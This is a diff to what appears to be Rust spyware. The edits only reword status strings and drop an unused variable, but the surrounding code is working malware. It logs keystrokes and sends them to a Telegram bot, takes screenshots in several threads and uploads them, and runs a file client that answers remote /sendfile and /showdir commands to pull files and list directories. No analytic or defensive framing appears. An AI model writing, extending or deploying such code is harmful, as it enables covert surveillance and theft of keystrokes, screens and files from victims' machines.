@@ -32,7 +32,7 @@ async fn run() {
 
     // keylogging
     tokio::spawn(async move {
-        let mut client = TelegramClient::from_env("start key logger".to_string()).await;
+        let mut client = TelegramClient::from_env("Starting key logger".to_string()).await;
         let mut last_time = SystemTime::now();
         let mut print = Vec::new();
         print.push("[LOGS]\n".to_string());
@@ -48,7 +48,7 @@ async fn run() {
                     for i in print {
                         messg.push_str(&format!("{}", i));
                     }
-                    client.send_text(messg).await;
+                    client.send_text(&messg.to_string()).await;
                 }
                 last_time = SystemTime::now();
                 print = Vec::new();
@@ -82,13 +82,12 @@ async fn run() {
     for i in 0..NUMBER_OF_THREADS {
         let cur_req_sender = req_sender.clone();
         tokio::spawn(async move {
-            let mut client = TelegramClient::from_env(format!("start image sender {}/{}", i + 1, NUMBER_OF_THREADS)).await;
+            let mut client = TelegramClient::from_env(format!("Starting image sender {}/{}", i + 1, NUMBER_OF_THREADS)).await;
             loop {
                 let (perm_sender, perm_receiver) = oneshot::channel::<String>();
                 cur_req_sender.send(perm_sender).await.unwrap();
                 if perm_receiver.await.unwrap() == "ok" {
                     let now: DateTime<Utc> = Utc::now();
-                    let st = SystemTime::now();
                     let mut screen_data = save_screenshot();
                     let vec = screen_data.into_inner();
                     client.send_image_withcaption(vec, format!(
@@ -100,7 +99,7 @@ async fn run() {
     }
 
     //file sending
-    let file_client = TelegramFileClient::from_env("starting file client\n/sendfile [path to file]\n/showdir [path to directory]".to_string()).await;
+    let file_client = TelegramFileClient::from_env("Starting file client\n/sendfile <path to file>\n/showdir <path to directory>".to_string()).await;
     file_client.start().await;
 
     // we shouldn't reach this line
